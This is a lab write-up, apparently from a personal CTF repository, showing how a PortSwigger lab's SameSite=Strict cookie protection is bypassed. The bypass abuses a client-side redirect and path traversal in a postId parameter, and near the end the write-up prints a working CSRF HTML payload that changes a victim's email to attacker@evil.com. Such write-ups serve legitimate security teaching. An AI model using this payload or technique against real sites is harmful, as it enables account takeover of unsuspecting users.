# SameSite Strict bypass via client-side redirect

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect), you'll learn: SameSite Strict bypass via client-side redirect! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a [CSRF attack](https://portswigger.net/web-security/csrf) that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113191421.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113191430.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113191455.png)

**When we're logged in successfully, it'll set a new session cookie for us:**
```
Set-Cookie: session=YXhMRVKeqb8ShWXU33TCvm1ifYsfjvdF; Secure; HttpOnly; SameSite=Strict
```

In here, we can see **there is a `SameSite` attribute, which is set to `Strict` restriction.**

**View source page:**
```html
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: wiener@normal-user.net</p>
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="">
        <input required hidden name='submit' value='1'>
        <button class='button' type='submit'> Update email </button>
    </form>
</div>
```

As you can see, the form doesn't have a CSRF token parameter, which helps to prevent CSRF (Cross-Site Request Forgery) attack. So, it may be vulnerable to CSRF.

When we submit the form, it'll send a POST request to `/my-account/change-email`, with parameter `email`, `submit`.

Let's try to update our email address:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113191841.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113191847.png)

Works fine.

However, in order to exploit CSRF, we first have to **bypass the `SameSite=Strict` restriction.**

- Strict restriction:

If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.

If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.

That being said, we need to find another vulnerability to successfully exploit CSRF.

In the home page, we can view different posts:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113192521.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113192530.png)

And we can leave some comments.

Let's leave a test comment:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113192707.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113192935.png)

**After we send the request, it'll fetch a JavaScript file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113192954.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113192809.png)

**`/resources/js/commentConfirmationRedirect.js`:**
```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

**When we go to `/post/comment/confirmation`, it'll run that JavaScript:**

- After 3 seconds, redirect user to `/post/<postId>`

**However, the GET parameter `postId` is fully under attacker's control!**

**Now, what if I change the path to `/my-account` via path traversal?**
```
/post/comment/confirmation?postId=../my-account/change-email
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113194217.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113194309.png)

It worked! Also, endpoint `/my-account/change-email` accept GET method!

**Armed with above information, we can craft a CSRF payload:**
```html
<html>
    <head>
        <title>CSRF-8</title>
    </head>
    <body>
        <script type="text/javascript">
            // Before URL encoded:
            // ?postId=../my-account/change-email?email=attacker@evil.com&submit=1
            document.location = 'https://0af50062047c8490c05fc7e3004600e4.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3Femail%3Dattacker%40evil.com%26submit%3D1';
        </script>
    </body>
</html>
```

This HTML payload will redirect user to our `/post/comment/confirmation` upon visit, then using the path traversal technique to exploit CSRF.

Let's host it on the exploit server and test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113194826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113194837.png)

It worked! Let's deliver the payload to victim!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113194904.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-8/images/Pasted%20image%2020230113194912.png)

# What we've learned:

1. SameSite Strict bypass via client-side redirect